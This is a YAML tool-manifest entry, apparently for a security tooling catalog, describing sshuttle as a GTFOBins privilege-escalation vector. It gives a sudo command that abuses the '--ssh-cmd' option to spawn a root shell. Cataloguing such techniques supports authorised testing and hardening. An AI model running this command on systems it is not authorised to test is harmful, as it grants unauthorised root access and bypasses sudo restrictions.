---
id: network-vpn-sshuttle
namespace: network:vpn:sshuttle
name: sshuttle
description: "Transparent VPN over SSH; can execute remote commands."
author: GTFOBins
version: 1.0.0
capabilities:
- security.privilege-escalation.shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- sshuttle
parameters: []
features: []
execution:
  template: sshuttle
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Spawn an interactive shell (sudo)
  command: sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/sshuttle/
techniques:
- privilege-escalation
- execution
install:
- method: apt
  package_name: sshuttle
  commands:
  - apt-get install -y sshuttle
---


# sshuttle

sshuttle is a command-line utility. Transparent VPN over SSH; can also spawn an interactive shell.
